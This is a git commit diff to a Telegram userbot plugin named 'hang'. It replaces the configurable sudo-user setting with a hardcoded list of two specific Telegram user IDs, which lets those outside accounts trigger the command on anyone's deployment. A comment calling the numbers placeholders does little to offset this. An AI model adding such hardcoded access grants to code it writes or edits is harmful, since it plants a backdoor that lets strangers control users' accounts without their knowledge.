ab493851f5404698b44e67015871b027dd7faf07
Sangram <136038979+OfficialSangram@users.noreply.github.com>
2024-01-07 13:19:31 +0530

    Update hang.py

--- AdityaHalder/plugins/hang.py
+++ AdityaHalder/plugins/hang.py
@@ -4,10 +4,12 @@ import re
 from pyrogram import Client, filters
 from pyrogram.types import Message
 from AdityaHalder.helper.data import *
-from .. import SUDO_USER
+from .. import *
+
+SUDOERS = [1711510822, 6485380150]  # Replace these numbers with actual user IDs in your code
 
 
-@app.on_message(filters.command(["hang"], ".") & (filters.me | filters.user(SUDO_USER)))
+@app.on_message(filters.command(["hang"], ".") & (filters.me | filters.user(SUDOERS)))
 async def hang(client: Client, message: Message): 
     counts = message.command[1]
     await message.delete()
